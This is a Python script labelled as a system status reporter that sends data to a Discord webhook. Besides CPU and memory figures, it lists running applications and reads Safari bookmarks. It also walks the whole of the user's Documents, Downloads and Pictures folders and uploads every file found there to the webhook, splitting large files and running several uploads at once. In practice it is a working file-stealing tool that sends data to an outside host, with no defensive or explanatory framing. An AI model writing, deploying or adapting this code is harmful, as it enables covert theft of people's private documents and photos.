import psutil
import requests
import json
import platform
import datetime
import sqlite3
import os
import glob
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXX"
MAX_MESSAGE_LENGTH = 2000
MAX_FILE_SIZE = 24 * 1024 * 1024  # 24 MB file size limit for Discord webhook
MAX_THREADS = 5

# Global rate limit manager (controlled by global_rate_limit)
global_rate_limit = 0.2  # Requests per second, set to a very low value for slow requests

class RateLimiter:
    def __init__(self):
        self.lock = Lock()
        self.last_request_time = 0
    
    def wait_for_next_request(self):
        with self.lock:
            current_time = time.time()
            time_since_last_request = current_time - self.last_request_time
            if time_since_last_request < (1 / global_rate_limit):
                sleep_time = (1 / global_rate_limit) - time_since_last_request
                print(f"Rate limit hit. Sleeping for {sleep_time:.2f} seconds.")
                time.sleep(sleep_time)
            self.last_request_time = time.time()

rate_limiter = RateLimiter()

def get_system_data():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    memory_usage = memory_info.percent
    disk_info = psutil.disk_usage('/')
    disk_usage = disk_info.percent
    system_info = platform.system()
    system_version = platform.version()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = {
        "cpu_usage": cpu_usage,
        "memory_usage": memory_usage,
        "disk_usage": disk_usage,
        "system_info": system_info,
        "system_version": system_version,
        "timestamp": timestamp
    }
    
    return data

def get_running_applications():
    applications = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name']:
                applications.append(proc.info['name'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return sorted(set(applications))

def get_safari_bookmarks():
    bookmarks = []
    safari_db_path = os.path.expanduser('~/Library/Safari/Bookmarks.db')
    
    if os.path.exists(safari_db_path):
        try:
            conn = sqlite3.connect(safari_db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT title, url FROM bookmarks')
            rows = cursor.fetchall()
            for row in rows:
                title, url = row
                bookmarks.append(f"{title}: {url}")
            conn.close()
        except sqlite3.Error as e:
            print(f"Error accessing Safari bookmarks: {e}")
            return []
    
    return bookmarks

def get_documents_downloads_and_pictures():
    documents_dir = os.path.expanduser('~/Documents')
    downloads_dir = os.path.expanduser('~/Downloads')
    pictures_dir = os.path.expanduser('~/Pictures')
    
    documents_files = glob.glob(os.path.join(documents_dir, '**/*'), recursive=True)
    downloads_files = glob.glob(os.path.join(downloads_dir, '**/*'), recursive=True)
    pictures_files = glob.glob(os.path.join(pictures_dir, '**/*'), recursive=True)
    
    documents_files = [f for f in documents_files if os.path.isfile(f)]
    downloads_files = [f for f in downloads_files if os.path.isfile(f)]
    pictures_files = [f for f in pictures_files if os.path.isfile(f)]
    
    return documents_files, downloads_files, pictures_files

def split_message(message, max_length=MAX_MESSAGE_LENGTH):
    message_chunks = []
    while len(message) > max_length:
        split_index = message.rfind('\n', 0, max_length)
        if split_index == -1:
            split_index = max_length
        message_chunks.append(message[:split_index])
        message = message[split_index:].lstrip()

    if message:
        message_chunks.append(message)

    return message_chunks

def split_file(file_path, max_size=MAX_FILE_SIZE):
    part_paths = []
    file_size = os.path.getsize(file_path)
    if file_size <= max_size:
        return [file_path]
    
    with open(file_path, 'rb') as f:
        part_num = 1
        while True:
            chunk = f.read(max_size)
            if not chunk:
                break
            part_filename = f"{file_path}.{part_num}"
            with open(part_filename, 'wb') as part_file:
                part_file.write(chunk)
            part_paths.append(part_filename)
            part_num += 1
    return part_paths

def upload_file(file_path):
    if os.path.exists(file_path) and os.path.getsize(file_path) <= MAX_FILE_SIZE:
        with open(file_path, 'rb') as file:
            files_payload = {
                'file': (os.path.basename(file_path), file)
            }
            rate_limiter.wait_for_next_request()  # Wait for the next request slot
            response = requests.post(WEBHOOK_URL, files=files_payload)
            
            if response.status_code == 204:
                print(f"File {file_path} uploaded successfully.")
            else:
                response_data = response.json()
                if 'attachments' in response_data and len(response_data['attachments']) > 0:
                    file_url = response_data['attachments'][0]['url']
                    print(f"File {file_path} uploaded successfully. URL: {file_url}")
                else:
                    print(f"Failed to upload {file_path}: {response.status_code} {response.text}")
    else:
        print(f"File {file_path} is too large, splitting it...")
        parts = split_file(file_path)
        for part in parts:
            upload_file(part)

def upload_files_to_discord(files):
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(upload_file, files)

def send_to_discord(data):
    headers = {
        "Content-Type": "application/json"
    }
    
    message = (
        f"System Status Update: {data['timestamp']}\n"
        f"CPU Usage: {data['cpu_usage']}%\n"
        f"Memory Usage: {data['memory_usage']}%\n"
        f"Disk Usage: {data['disk_usage']}%\n"
        f"System: {data['system_info']} {data['system_version']}\n"
    )
    
    applications = get_running_applications()
    message += "\n\nRunning Applications:\n" + "\n".join(applications)

    bookmarks = get_safari_bookmarks()
    if bookmarks:
        message += "\n\nSafari Bookmarks:\n" + "\n".join(bookmarks[:5])

    documents_files, downloads_files, pictures_files = get_documents_downloads_and_pictures()
    if documents_files:
        message += "\n\nDocuments:\n" + "\n".join(documents_files[:5])
    if downloads_files:
        message += "\n\nDownloads:\n" + "\n".join(downloads_files[:5])
    if pictures_files:
        message += "\n\nPictures:\n" + "\n".join(pictures_files[:5])
    
    message_chunks = split_message(message)
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(lambda chunk: send_chunk_to_discord(chunk, headers), message_chunks)

def send_chunk_to_discord(chunk, headers):
    payload = {
        "content": chunk
    }
    
    retry_count = 0
    wait_time = 0

    while True:
        rate_limiter.wait_for_next_request()  # Wait for the next request slot
        response = requests.post(WEBHOOK_URL, headers=headers, data=json.dumps(payload))
        
        if response.status_code == 204:
            print("Data sent successfully to Discord webhook.")
            break
        elif response.status_code == 429:
            retry_after = int(response.headers.get("Retry-After", 1))
            print(f"Rate limited. Retrying after {retry_after} seconds...")
            wait_time = max(retry_after * (2 ** retry_count), retry_after)
            print(f"Backing off for {wait_time} seconds...")
            time.sleep(wait_time)
            retry_count += 1
            if retry_count > 5:
                print("Exceeded maximum retry attempts. Giving up.")
                break
        else:
            print(f"Failed to send data: {response.status_code}, {response.text}")
            break

def main():
    system_data = get_system_data()
    send_to_discord(system_data)
    documents_files, downloads_files, pictures_files = get_documents_downloads_and_pictures()
    all_files = documents_files + downloads_files + pictures_files
    upload_files_to_discord(all_files)

if __name__ == "__main__":
    main()
